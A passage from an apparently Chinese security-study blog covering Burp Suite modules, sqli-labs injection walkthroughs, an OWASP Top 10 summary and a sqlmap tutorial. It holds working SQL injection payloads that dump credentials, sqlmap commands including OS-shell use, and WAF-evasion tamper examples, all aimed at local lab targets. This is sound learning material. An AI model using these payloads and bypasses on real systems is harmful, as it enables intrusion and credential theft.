<h3 id="主动扫描"><a href="#主动扫描" class="headerlink" title="主动扫描"></a>主动扫描</h3><p>当使用主动扫描模式时，Burp会向应用发送新的请求并通过Payload验证漏洞。这种模式下的操作会产生大量的请求和应答数据，直接影响服务端的性能，通常用于非生产环境。主动扫描适用于以下这两类漏洞。</p>
<p>● <strong>客户端的漏洞，如XSS、HTTP头注入、操作重定向。</strong></p>
<p>● <strong>服务端的漏洞，如SQL注入、命令行注入、文件遍历。</strong></p>
<p>对第一类漏洞，Burp在检测时会提交input域，然后根据应答的数据进行解析。在检测过程中，Burp会对基础的请求信息进行修改，即根据漏洞的特征对参数进行修改，模拟人的行为，以达到检测漏洞的目的；</p>
<p>对第二类漏洞，以SQL注入为例，服务端有可能返回数据库错误提示信息，也有可能什么都不反馈。Burp在检测过程中会采用各个技术验证漏洞是否存在，例如诱导时间延迟、强制修改Boolean值、与模糊测试的结果进行比较，以提高漏洞扫描报告的准确性。</p>
<h3 id="被动扫描"><a href="#被动扫描" class="headerlink" title="被动扫描"></a>被动扫描</h3><p>当使用被动扫描模式时，Burp不会重新发送新的请求，只是对已经存在的请求和应答进行分析，对服务端的检测来说，这比较安全，通常适用于生产环境的检测。一般来说，下列漏洞在被动模式中容易被检测出来。</p>
<p>● 提交的密码为未加密的明文。</p>
<p>● 不安全的cookie的属性，例如缺少HttpOnly和安全标志。</p>
<p>● cookie的范围缺失。</p>
<p>● 跨域脚本包含和站点引用泄露。</p>
<p>● 表单值自动填充，尤其是密码。</p>
<p>● SSL保护的内容缓存。</p>
<p>● 目录列表。</p>
<p>● 提交密码后应答延迟。</p>
<p>● session令牌的不安全传输。</p>
<p>● 敏感信息泄露，例如内部IP地址、电子邮件地址、堆栈跟踪等信息泄露。</p>
<p>● 不安全的ViewState的配置。</p>
<p>● 错误或不规范的Content-Type指令。</p>
<p>这种扫描避免了平时测试破坏的可能。</p>
<h2 id="Intruder"><a href="#Intruder" class="headerlink" title="Intruder"></a>Intruder</h2><p>可以对Web应用程序进行自动化攻击，如通过标识符枚举用户名、ID和账户号码，模糊测试，SQL注入，跨站，目录遍历等。</p>
<p>工作原理是Intruder在原始请求数据的基础上，通过修改各种请求参数获取不同的请求应答。在每一次请求中，Intruder通常会携带一个或多个有效攻击载荷（Payload），在不同的位置进行攻击重放，通过应答数据的比对分析获得需要的特征数据。Burp Intruder通常被应用于以下场景。</p>
<p>Intruder适用场景如：</p>
<blockquote>
<p>● 标识符枚举。Web应用程序经常使用标识符引用用户、账户、资产等数据信息。例如，用户名、文件ID和账户号码。</p>
<p>● 提取有用的数据。在某些场景下，不是简单地识别有效标识符，而是通过简单标识符提取其他数据。例如，通过用户的个人空间ID获取所有用户在其个人空间的名字和年龄。</p>
<p>● 模糊测试。很多输入型的漏洞（如SQL注入、跨站点脚本和文件路径遍历）可以通过请求参数提交各种测试字符串，并分析错误消息和其他异常情况，来对应用程序进行检测。受限于应用程序的大小和复杂性，手动执行这个测试是一个耗时且烦琐的过程，因此可以设置Payload，通过Burp Intruder自动化地对Web应用程序进行模糊测试。</p>
</blockquote>
<p>一般需要你有很好的字典，才可以有效地进行爆破、遍历。</p>
<p>它有几个常见的模式</p>
<blockquote>
<p>● Sniper模式使用单一的Payload组。它会针对每个位置设置Payload。这种攻击类型适用于对常见漏洞中的<strong>请求参数单独进行Fuzzing测试</strong>的情景。攻击中的请求总数应该是position数量和Payload数量的乘积。</p>
<p>● Battering ram模式使用单一的Payload组。它会重复Payload并一次性把所有相同的Payload放入指定的位置中。这种攻击适用于需要在请求中<strong>把相同的输入放到多个位置的情景</strong>。请求的总数是Payload组中Payload的总数。</p>
<p>● Pitchfork模式使用多个Payload组。攻击会同步迭代所有的Payload组，把Payload放入每个定义的位置中。这种攻击类型非常适合<strong>在不同位置中需要插入不同但相似输入的情况</strong>。请求的数量应该是最小的Payload组中的Payload数量。</p>
<p>● Cluster bomb模式会使用多个Payload组。每个定义的位置中有不同的Payload组。攻击会迭代每个Payload组，每种Payload组合都会被测试一遍。这种攻击适用于在位置中<strong>需要不同且不相关或者未知输入攻击的情景</strong>。攻击请求的总数是各Payload组中Payload数量的乘积。</p>
</blockquote>
<p>对Status或Length的返回值进行排序，有不同之处，则认为破解成功</p>
<p>盲注一般也会依靠这个，但更多是用脚本。</p>
<h2 id="Repeater"><a href="#Repeater" class="headerlink" title="Repeater"></a>Repeater</h2><p>手动修改、补发个别HTTP请求，并分析它们的响应的工具。它最大的用途就是能和其他Burp Suite工具结合起来使用。可以将目标站点地图、Burp Proxy浏览记录、Burp Intruder的攻击结果，发送到Repeater上，并手动调整这个请求来对漏洞的探测或攻击进行微调。</p>
<p>bp有四种类型显示数据包</p>
<p>● Raw主要显示Web请求的raw格式，以纯文本的形式显示数据包，包含请求地址、HTTP协议版本、主机头、浏览器信息、Accept可接受的内容类型、字符集、编码方式、cookie等，可以通过手动修改这些信息，对服务器端进行渗透测试。</p>
<p>● Params主要显示客户端请求的参数信息，包括GET或者POST请求的参数、cookie参数。可以通过修改这些请求参数完成对服务器端的渗透测试。</p>
<p>● Headers中显示的是数据包中的头信息，以名称、值的形式显示数据包。</p>
<p>● Hex对应的是Raw中信息的二进制内容，可以通过Hex编辑器对请求的内容进行修改，在进行00截断时非常好用</p>
<p>不想重复捕获，要反复测试时，可以将包放进repeater模块。</p>
<h2 id="Comparer"><a href="#Comparer" class="headerlink" title="Comparer"></a>Comparer</h2><p>提供一个可视化的差异比对功能，来对比分析两次数据之间的区别</p>
<h2 id="Sequencer"><a href="#Sequencer" class="headerlink" title="Sequencer"></a>Sequencer</h2><p>分析数据样本随机性质量的工具。可以用它测试应用程序的会话令牌（Session token）、密码重置令牌是否可预测等场景，通过Sequencer的数据样本分析，能很好地降低这些关键数据被伪造的风险。</p>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>bp工具</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs</title>
    <url>/2023/05/20/sqli-labs/</url>
    <content><![CDATA[<p>做题记录存在自己的有道云上，准备挑选后再刷一遍，慢慢更新。</p>
<h2 id="less-11（post请求注入）"><a href="#less-11（post请求注入）" class="headerlink" title="less 11（post请求注入）"></a>less 11（post请求注入）</h2><p>随便输入账号名ad或者ad”，页面报错，但是输入ad’</p>
<p>发现提示</p>
<p><code>...e right syntax to use near &#39;admi&#39; LIMIT 0,1&#39; at line 1</code></p>
<p>说明是存在字符型注入中的<strong>单引号</strong>注入的</p>
<p>用order by 尝试后发现存在联合注入的，爆破即可</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523154632755.png" alt="image-20230523154632755"></p>
<h2 id="less-18（http代理）"><a href="#less-18（http代理）" class="headerlink" title="less 18（http代理）"></a>less 18（http代理）</h2><p>这个输入admin,admin正确账号，显示User agent信息</p>
<p>抓包，将User-Agent处改为，123’(123,和123”均正常显示)，提示如下：</p>
<blockquote>
<p>…right syntax to use near ‘127.0.0.1’, ‘admin’)’ at line 1</p>
</blockquote>
<p>可以判定是有单引号的闭合</p>
<h3 id="思路1："><a href="#思路1：" class="headerlink" title="思路1："></a>思路1：</h3><p>123’#试试，提示如下</p>
<blockquote>
<p>the right syntax to use near ‘’ at line 1</p>
</blockquote>
<p>123’’(两个单引号)试试，页面正常，故认为是<strong>闭合了两边的单引号</strong></p>
<p>（这里一定是原码中有两个用到单引号的参数，见如下的uagent和IP）</p>
<blockquote>
<p>$insert&#x3D;”INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘$uagent’, ‘$IP’, $uname)”;</p>
</blockquote>
<p><code>123&#39; and updatexml(1,concat(0x5e,database()),3) and  &#39; </code>爆库：</p>
<blockquote>
<p>XPATH syntax error: ‘^security’</p>
</blockquote>
<p>and替换成or也是可以的</p>
<p><code>123&#39; and updatexml(1,concat(0x5e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),3) and  &#39; </code>爆表:</p>
<blockquote>
<p>XPATH syntax error: ‘^emails,referers,uagents,users’</p>
</blockquote>
<p><code>123&#39; and updatexml(1,concat(0x5e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)),3) and  &#39; </code>爆列:</p>
<blockquote>
<p>XPATH syntax error: ‘^id,username,password’</p>
</blockquote>
<p><code>123&#39; and updatexml(1,concat(0x5e,(select group_concat(username,&#39;~&#39;,password) from security.users)),3) and  &#39;</code>爆security库下users表中的username和password列：</p>
<blockquote>
<p>XPATH syntax error: ‘^Dumb<del>133,Angelina</del>I-kill-you,Du…</p>
</blockquote>
<h3 id="思路2："><a href="#思路2：" class="headerlink" title="思路2："></a>思路2：</h3><p>看样子是两个参数，那就是123‘,2)#试试，提示</p>
<blockquote>
<p>Column count doesn’t match value count at row 1</p>
</blockquote>
<p>再加一个参数试试，123’,1,2)#，闭合成功。</p>
<p>这里与一般注入不一样，查询方式不是select了，通过源码可以发现是insert语句：</p>
<blockquote>
<p>INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘$uagent’, ‘$IP’, $uname)</p>
</blockquote>
<p>所以要闭合VALUES.</p>
<p>利用$uagent，故构建格式，1’,1,1)#</p>
<p>则：</p>
<blockquote>
<p>INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘1’,1,1)#, ‘$IP’, $uname)</p>
</blockquote>
<p>即：</p>
<blockquote>
<p>INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘1’,1,1)#</p>
</blockquote>
<p>爆库语句：<code>1&#39;,1,updatexml(1,concat(0x5e,database()),3))#</code></p>
<blockquote>
<p>  XPATH syntax error: ‘^security’</p>
</blockquote>
<p>其余语句类似思路1。</p>
<h2 id="less-20-cookie注入"><a href="#less-20-cookie注入" class="headerlink" title="less 20 (cookie注入)"></a>less 20 (cookie注入)</h2><h3 id="思路1：-1"><a href="#思路1：-1" class="headerlink" title="思路1："></a>思路1：</h3><p>有一个正确的账号密码登录后，显示了cookie信息</p>
<p>admin’，有报错信息…LIMIT..</p>
<p>注释掉后，即admin’#，页面正常。</p>
<p><code>Cookie: uname=admin&#39; order by 3#</code>正常，4报错，故有3列</p>
<p><code>Cookie: uname=-admin&#39; union select 1,database(),3 #</code>联合注入即可。</p>
<h3 id="思路2：-1"><a href="#思路2：-1" class="headerlink" title="思路2："></a>思路2：</h3><p><code>Cookie: uname=-admin&#39; and updatexml(1,concat(&#39;!&#39;,database()),3)#</code></p>
<p>嗯，报错注入也是可行的</p>
]]></content>
      <categories>
        <category>web漏洞</category>
        <category>sql注入</category>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>owasp top10</title>
    <url>/2023/05/13/owasp-top10%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="1-注入漏洞原理："><a href="#1-注入漏洞原理：" class="headerlink" title="1.注入漏洞原理："></a>1.注入漏洞原理：</h2><p>（Injection）攻击者向应用程序中输入恶意代码，使其执行未经授权的操作。 </p>
<p>攻击方式：SQL注入、LDAP注入、OS命令注入等。</p>
<p> 防御方法：使用参数化查询&#x2F;预编译(这样缺的只是数据，不会对sql语句造成其他影响，因为sql语句已经通过预编译技术固定下来了)、输入校验和白名单、最小化权限等。</p>
<p>但是预编译的话，也是存在绕过的，那就是case when绕过。</p>
<h2 id="2-认证和授权漏洞原理："><a href="#2-认证和授权漏洞原理：" class="headerlink" title="2.认证和授权漏洞原理："></a>2.认证和授权漏洞原理：</h2><p>（Authentication and Authorization） 攻击者绕过或破解应用程序的身份验证和授权机制，以获取未经授权的访问权限。 </p>
<p>攻击方式：密码猜测、会话劫持、CSRF等。</p>
<p> 防御方法：强密码策略、多因素身份验证、会话管理、访问控制等。</p>
<h2 id="3-垂直越权漏洞原理："><a href="#3-垂直越权漏洞原理：" class="headerlink" title="3.垂直越权漏洞原理："></a>3.垂直越权漏洞原理：</h2><p>（Sensitive Data Exposure） 应用程序在未加密或未正确加密的情况下存储和传输敏感信息。 </p>
<p>攻击方式：网络嗅探、数据泄露等。 </p>
<p>防御方法：加密、数据保护、强密码策略等。</p>
<h2 id="4-XML外部实体漏洞原理："><a href="#4-XML外部实体漏洞原理：" class="headerlink" title="4.XML外部实体漏洞原理："></a>4.XML外部实体漏洞原理：</h2><p>（XML External Entities (XXE)） 应用程序解析XML时，未正确处理外部实体，导致攻击者可以访问系统文件、执行命令等。</p>
<p> 攻击方式：XXE攻击等。</p>
<p> 防御方法：禁用外部实体、使用最新版本的XML解析器、输入校验等。</p>
<h2 id="5-失效的访问控制漏洞原理："><a href="#5-失效的访问控制漏洞原理：" class="headerlink" title="5.失效的访问控制漏洞原理："></a>5.失效的访问控制漏洞原理：</h2><p>（Broken Access Control） 应用程序未正确实现访问控制机制，导致攻击者能够访问未授权的资源。 </p>
<p>攻击方式：直接访问、暴力破解等。 </p>
<p>防御方法：访问控制、安全编码、安全测试等。</p>
<h2 id="6-安全配置错误漏洞原理："><a href="#6-安全配置错误漏洞原理：" class="headerlink" title="6.安全配置错误漏洞原理："></a>6.安全配置错误漏洞原理：</h2><p>（Security Misconfiguration） 应用程序或其环境未正确配置，导致攻击者可以访问敏感信息、执行未经授权的操作等。 </p>
<p>攻击方式：目录遍历、错误页面泄露等。 </p>
<p>防御方法：安全配置、代码审计、最小化权限等。</p>
<h2 id="7-跨站脚本攻击漏洞原理："><a href="#7-跨站脚本攻击漏洞原理：" class="headerlink" title="7.跨站脚本攻击漏洞原理："></a>7.跨站脚本攻击漏洞原理：</h2><p>（Cross-Site Scripting (XSS)） 攻击者向应用程序中输入恶意脚本，使其在用户的浏览器中执行。 </p>
<p>详细解释：例如在表单中提交含有可执行的javascript的内容文本，如果服务器端没有过滤或转义这些脚本，而这些脚本由通过内容的形式发布到了页面上，这个时候如果有其他用户访问这个网页，那么浏览器就会执行这些脚本，从而被攻击，从而获取用户的cookie等信息。</p>
<p>攻击方式：反射型XSS、存储型XSS等。</p>
<p> 防御方法：输入校验、输出转义、HTTPOnly标记等。</p>
<h2 id="8-不安全的反序列化漏洞原理："><a href="#8-不安全的反序列化漏洞原理：" class="headerlink" title="8.不安全的反序列化漏洞原理："></a>8.不安全的反序列化漏洞原理：</h2><p>（Insecure Deserialization）应用程序在反序列化数据时未正确验证其完整性和有效性，导致攻击者可以执行未经授权的代码。</p>
<p> 攻击方式：注入恶意对象等。</p>
<p> 防御方法：输入验证、使用最新版本的序列化器、最小化权限等。</p>
<h2 id="9-使用含有已知漏洞的组件原理："><a href="#9-使用含有已知漏洞的组件原理：" class="headerlink" title="9.使用含有已知漏洞的组件原理："></a>9.使用含有已知漏洞的组件原理：</h2><p>（Using Components with Known Vulnerabilities） 应用程序使用已知存在漏洞的第三方组件，导致攻击者可以利用这些漏洞攻击应用程序。 </p>
<p>攻击方式：利用已知漏洞等。</p>
<p> 防御方法：使用最新版本的组件、实时跟踪漏洞等。</p>
<h2 id="10-不足的日志记录与监控原理："><a href="#10-不足的日志记录与监控原理：" class="headerlink" title="10.不足的日志记录与监控原理："></a>10.不足的日志记录与监控原理：</h2><p>（Insufficient Logging &amp; Monitoring）应用程序未正确记录或监控其活动，导致攻击者可以执行未经授权的操作而不被检测。</p>
<p> 攻击方式：暴力破解、DDoS攻击等。</p>
<p> 防御方法：安全审计、日志监控、入侵检测等。</p>
]]></content>
      <categories>
        <category>top10</category>
      </categories>
      <tags>
        <tag>xss</tag>
        <tag>漏洞</tag>
        <tag>RCE</tag>
        <tag>upload</tag>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap使用</title>
    <url>/2023/05/20/sqlmap%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>以sqli-labs为例,php版本为5.3，我的高版本会出错</p>
<p>windows下，cmd命令中切换到sqlmap.py所在文件夹</p>
<h1 id="一、基础"><a href="#一、基础" class="headerlink" title="一、基础"></a>一、基础</h1><h2 id="1-判断是否存在注入"><a href="#1-判断是否存在注入" class="headerlink" title="1.判断是否存在注入"></a>1.判断是否存在注入</h2><p>假设目标注入点是<a href="http://localhost:81/sqli/Less-1/?id=11%EF%BC%8C%E5%88%A4%E6%96%AD%E5%85%B6%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E7%9A%84%E5%91%BD%E4%BB%A4%E5%A6%82%E4%B8%8B%E6%89%80%E7%A4%BA%E3%80%82">http://localhost:81/sqli/Less-1/?id=11，判断其是否存在注入的命令如下所示。</a></p>
<p><code>sqlmap.py -u http://localhost:81/sqli/Less-1/?id=1</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620141227729.png"></p>
<p>当注入点后的参数2个以上，需要加双引号</p>
<p><code>sqlmap.py -u &quot;http://localhost:81/sqli/Less-1/?id=1&amp;uid=2 &quot;</code></p>
<h2 id="2-判断文本中的请求是否存在注入"><a href="#2-判断文本中的请求是否存在注入" class="headerlink" title="2.判断文本中的请求是否存在注入"></a>2.判断文本中的请求是否存在注入</h2><p>从文件中加载HTTP请求，SQLMap可以从一个文本文件中获取HTTP请求，这样就可以不设置其他参数（如cookie、POST数据等）,txt文件中的内容为Web数据包</p>
<p>也就是bp抓包拦截的请求内容，保存为txt文件，之后</p>
<p><code>sqlmap.py –r desktop/1.txt</code> &#x2F;&#x2F;-r一般在存在cookie注入时使用</p>
<h2 id="3-查询当前用户下的所有数据库"><a href="#3-查询当前用户下的所有数据库" class="headerlink" title="3.查询当前用户下的所有数据库"></a>3.查询当前用户下的所有数据库</h2><p>该命令是确定网站存在注入后，用于查询当前用户下的所有数据库，如下所示。如果当前用户有权限读取包含所有数据库列表信息的表，使用该命令就可以列出所有数据库</p>
<p><code>sqlmap.py -u http://localhost:81/sqli/Less-1/?id=1 --dbs </code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620141633613.png"></p>
<p>想查询xxx数据库下的表名时，–dbs缩写为 <code>-D xxx</code></p>
<h2 id="4-爆表"><a href="#4-爆表" class="headerlink" title="4.爆表"></a>4.爆表</h2><p><code>sqlmap.py -u http://localhost:81/sqli/Less-1/?id=1 -D security --tables</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620141930429.png"></p>
<p>继续注入时，–tables缩写成-T</p>
<h2 id="5-爆列"><a href="#5-爆列" class="headerlink" title="5.爆列"></a>5.爆列</h2><p><code>sqlmap.py -u http://localhost:81/sqli/Less-1/?id=1 -D security -T users --columns</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620142054630.png"></p>
<p>后续的注入中，–columns缩写成-C</p>
<h2 id="6-爆字段"><a href="#6-爆字段" class="headerlink" title="6.爆字段"></a>6.爆字段</h2><p><code>sqlmap.py -u http://localhost:81/sqli/Less-1/?id=1 -D security -T users -C password,username --dump</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620142235027.png"></p>
<h2 id="7-获取数据库的所有用户"><a href="#7-获取数据库的所有用户" class="headerlink" title="7.获取数据库的所有用户"></a>7.获取数据库的所有用户</h2><p>该命令的作用是列出数据库的所有用户，如下所示。在当前用户有权限读取包含所有用户的表的权限时，使用该命令就可以列出所有管理用户。</p>
<p><code>sqlmap.py ...?id=1 --users</code></p>
<h2 id="8-获取数据库用户的密码"><a href="#8-获取数据库用户的密码" class="headerlink" title="8.获取数据库用户的密码"></a>8.获取数据库用户的密码</h2><p>如果当前用户有读取包含用户密码的权限，SQLMap会先列举出用户，然后列出Hash，并尝试破解。</p>
<p><code>sqlmap.py -u...?id=1 --passwords</code></p>
<h2 id="9-获取当前网站数据库的名称"><a href="#9-获取当前网站数据库的名称" class="headerlink" title="9.获取当前网站数据库的名称"></a>9.获取当前网站数据库的名称</h2><p><code>-- current -db</code></p>
<h2 id="10-获取当前网站数据库的用户名称"><a href="#10-获取当前网站数据库的用户名称" class="headerlink" title="10.获取当前网站数据库的用户名称"></a>10.获取当前网站数据库的用户名称</h2><p><code>--current -user</code></p>
<h1 id="二、进阶"><a href="#二、进阶" class="headerlink" title="二、进阶"></a>二、进阶</h1><h2 id="1-–level-5：探测等级"><a href="#1-–level-5：探测等级" class="headerlink" title="1.–level 5：探测等级"></a>1.–level 5：探测等级</h2><p>参数–level 5指需要执行的测试等级，一共有5个等级（1～5），可不加level，默认是1。SQLMap使用的Payload可以在<strong>xml&#x2F;payloads.xml</strong>中看到，也可以根据相应的格式添加自己的Payload，<strong>其中5级包含的Payload最多</strong>，会自动破解出cookie、XFF等头部注入。当然，<strong>level 5的运行速度也比较慢</strong>。</p>
<p>这个参数会影响测试的注入点，GET和POST的数据都会进行测试，<strong>HTTP cookie在level为2时就会测试</strong>，<strong>HTTP User-Agent&#x2F;Referer头在level为3时就会测试。</strong>总之，在不确定哪个Payload或参数为注入点时，为了保证全面性，建议使用高的level值。</p>
<h2 id="2-–is-dba：当前用户是否为管理权限"><a href="#2-–is-dba：当前用户是否为管理权限" class="headerlink" title="2.–is-dba：当前用户是否为管理权限"></a>2.–is-dba：当前用户是否为管理权限</h2><p>该命令用于查看当前账户是否为数据库管理员账户，如下所示，在本案例中输入该命令，会返回Ture，如图3-15所示。</p>
<p><code>sqlmap.py –u ... --is-dba</code>&#x2F;&#x2F;最后两个不要分开写</p>
<p><img src="/../../../Typora/img111/image-20230620142942821.png"></p>
<h2 id="3-–roles：列出数据库管理员角色-oracle"><a href="#3-–roles：列出数据库管理员角色-oracle" class="headerlink" title="3.–roles：列出数据库管理员角色(oracle)"></a>3.–roles：列出数据库管理员角色(oracle)</h2><p>该命令用于查看数据库用户的角色。如果当前用户有权限读取包含所有用户的表，输入该命令会列举出每个用户的角色，也可以用-U参数指定想看哪个用户的角色。该命令仅适用于当前数据库是Oracle的时候。</p>
<h2 id="4-–referer-HTTP-Referer头"><a href="#4-–referer-HTTP-Referer头" class="headerlink" title="4.–referer:HTTP Referer头"></a>4.–referer:HTTP Referer头</h2><p>SQLMap可以在请求中伪造HTTP中的referer，当–level参数设定为3或3以上时，会尝试对referer注入。可以使用referer命令来欺骗，如–referer <a href="http://www.baidu.com./">http://www.baidu.com。</a></p>
<h2 id="5-–sql-shell：运行自定义SQL语句"><a href="#5-–sql-shell：运行自定义SQL语句" class="headerlink" title="5.–sql-shell：运行自定义SQL语句"></a>5.–sql-shell：运行自定义SQL语句</h2><p>该命令用于执行指定的SQL语句，如下所示，假设执行select*from users limit 0,1语句，结果如图3-17所示。</p>
<p>sqlmap.py –u “<a href="http://192.168.1.7/sql/union.php?id=1%22--sql-shell">http://192.168.1.7/sql/union.php?id=1&quot;--sql-shell</a></p>
<p>然后在下一行填入即可。</p>
<h2 id="6-–os-cmd-–os-shell：运行任意操作系统命令"><a href="#6-–os-cmd-–os-shell：运行任意操作系统命令" class="headerlink" title="6.–os-cmd,–os-shell：运行任意操作系统命令"></a>6.–os-cmd,–os-shell：运行任意操作系统命令</h2><blockquote>
<p>在数据库为MySQL、PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数时，<strong>如果数据库为MySQL、PostgreSQL,SQLMap上传一个二进制库，包含用户自定义的函数sys_exec（）和sys_eval（）</strong>，那么创建的这两个函数就可以执行系统命令。在Microsoft SQL Server中，SQLMap将使用xp_cmdshell存储过程，如果被禁用（在Microsoft SQL Server 2005及以上版本默认被禁制），则SQLMap会重新启用它；如果不存在，会自动创建。</p>
</blockquote>
<blockquote>
<p>用–os-shell参数可以模拟一个真实的Shell，输入想执行的命令。当不能执行多语句时（比如PHP或ASP的后端数据库为MySQL），仍然可以使用INTO OUTFILE写进可写目录，创建一个Web后门。–os-shell支持ASP、ASP.NET、JSP和PHP四种语言（要想执行改参数，需要有数据库管理员权限，也就是–is-dba的值要为True）。</p>
</blockquote>
<h2 id="7-–file-read：从数据库服务器中读取文件"><a href="#7-–file-read：从数据库服务器中读取文件" class="headerlink" title="7.–file-read：从数据库服务器中读取文件"></a>7.–file-read：从数据库服务器中读取文件</h2><p>该命令用于读取执行文件，当数据库为MySQL、PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数时，读取的文件可以是文本，也可以是二进制文件。</p>
<h2 id="8-–file-write–file-dest：上传文件到数据库服务器中"><a href="#8-–file-write–file-dest：上传文件到数据库服务器中" class="headerlink" title="8.–file-write–file-dest：上传文件到数据库服务器中"></a>8.–file-write–file-dest：上传文件到数据库服务器中</h2><p>该命令用于写入本地文件到服务器中，当数据库为MySQL、PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数时，上传的文件可以是文本，也可以是二进制文件。</p>
<h1 id="三、tamper模块"><a href="#三、tamper模块" class="headerlink" title="三、tamper模块"></a>三、tamper模块</h1><p>官方提供53个绕过脚本</p>
<p><code>sqlmap.py XXXXX--tamper &quot;模块名&quot;</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620144015919.png" alt="tamper格式"></p>
<p>一个最小的tamper脚本结构为priority变量定义和dependencies、tamper函数定义。</p>
<p>● priority定义脚本的优先级，用于有多个tamper脚本的情况。</p>
<p>● dependencies函数声明该脚本适用&#x2F;不适用的范围，可以为空。</p>
<p>下面以一个转大写字符绕过的脚本为例，tamper绕过脚本主要由dependencies和tamper两个函数构成。def tamper（payload,kwargs）函数接收playload和kwargs返回一个Payload。下面这段代码的意思是通过正则匹配所有字符，将所有攻击载荷中的字符转换为大写字母。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620143709879.png"></p>
<p>对一些网站是否有安全防护（WAF&#x2F;IDS&#x2F;IPS）进行试探，可以使用参数**–identify-waf**进行检测</p>
<h2 id="tamper脚本"><a href="#tamper脚本" class="headerlink" title="tamper脚本"></a>tamper脚本</h2><p>常用的tamper脚本。</p>
<p>● apostrophemask.py</p>
<p>作用：将引号替换为UTF-8，用于过滤单引号。</p>
<p>使用脚本前的语句为：</p>
<p>1 AND’1’&#x3D;’1</p>
<p>使用脚本后，语句为：</p>
<p>1 AND %EF%BC%871%EF%BC%87&#x3D;%EF%BC%871</p>
<p>● base64encode.py</p>
<p>作用：替换为base64编码。</p>
<p>使用脚本前的语句为：</p>
<p>1’ AND SLEEP（5）#</p>
<p>使用脚本后，语句为：</p>
<p>MScgQU5EIFNMRUVQKDUpIw&#x3D;&#x3D;</p>
<p>● multiplespaces.py</p>
<p>作用：围绕SQL关键字添加多个空格。</p>
<p>使用脚本前的语句为：</p>
<p>1 UNION SELECT foobar</p>
<p>使用脚本后，语句为：</p>
<p>1 UNION SELECT foobar</p>
<p>● space2plus.py</p>
<p>作用：用+号替换空格。</p>
<p>使用脚本前的语句为：</p>
<p>SELECT id FROM users</p>
<p>使用脚本后，语句为：</p>
<p>SELECT+id+FROM+users</p>
<p>● nonrecursivereplacement.py</p>
<p>作用：作为双重查询语句，用双重语句替代预定义的SQL关键字（适用于非常弱的自定义过滤器，例如将SELECT替换为空）。</p>
<p>使用脚本前的语句为：</p>
<p>1 UNION SELECT 2-</p>
<p>使用脚本后，语句为：</p>
<p>1 UNIOUNIONN SELESELECTCT 2-</p>
<p>● space2randomblank.py</p>
<p>作用：将空格替换为其他有效字符。</p>
<p>使用脚本前的语句为：</p>
<p>SELECT id FROM users</p>
<p>使用脚本后，语句为：</p>
<p>SELECT%0Did%0DFROM%0Ausers</p>
<p>● unionalltounion.py</p>
<p>作用：将UNION ALL SELECT替换为UNION SELECT。</p>
<p>使用脚本前的语句为：</p>
<p>-1 UNION ALL SELECT</p>
<p>使用脚本后，语句为：</p>
<p>-1 UNION SELECT</p>
<p>● securesphere.py</p>
<p>作用：追加特制的字符串。</p>
<p>使用脚本前的语句为：</p>
<p>1 AND 1&#x3D;1</p>
<p>使用脚本后，语句为：</p>
<p>1 AND 1&#x3D;1 and’0having’&#x3D;’0having’</p>
<p>● space2hash.py</p>
<p>作用：将空格替换为#号，并添加一个随机字符串和换行符。</p>
<p>使用脚本前的语句为：</p>
<p>1 AND 9227&#x3D;9227</p>
<p>使用脚本后，语句为：</p>
<p>1%23nVNaVoPYeva%0AAND%23ngNvzqu%0A9227&#x3D;9227</p>
<p>● space2mssqlblank.py（mssql）</p>
<p>作用：将空格替换为其他空符号。</p>
<p>使用脚本前的语句为：</p>
<p>SELECT id FROM users</p>
<p>使用脚本后，语句为：</p>
<p>SELECT%0Eid%0DFROM%07users</p>
<p>● space2mssqlhash.py</p>
<p>作用：将空格替换为#号，并添加一个换行符。</p>
<p>使用脚本前的语句为：</p>
<p>1 AND 9227&#x3D;9227</p>
<p>使用脚本后，语句为：</p>
<p>1%23%0AAND%23%0A9227&#x3D;9227</p>
<p>● between.py</p>
<p>作用：用NOT BETWEEN 0 AND替换大于号（&gt;），用BETWEEN AND替换等号（&#x3D;）。</p>
<p>使用脚本前的语句为：</p>
<p>1 AND A &gt; B-</p>
<p>使用脚本后，语句为：</p>
<p>1 AND A NOT BETWEEN 0 AND B-</p>
<p>使用脚本前的语句为：</p>
<p>1 AND A&#x3D;B-</p>
<p>使用脚本后，语句为：</p>
<p>1 AND A BETWEEN B AND B-</p>
<p>● percentage.py</p>
<p>作用：ASP允许在每个字符前面添加一个%号。</p>
<p>使用脚本前的语句为：</p>
<p>SELECT FIELD FROM TABLE</p>
<p>使用脚本后，语句为：</p>
<p>%S%E%L%E%C%T%F%I%E%L%D%F%R%O%M%T%A% B%L%E</p>
<p>● sp_password.py</p>
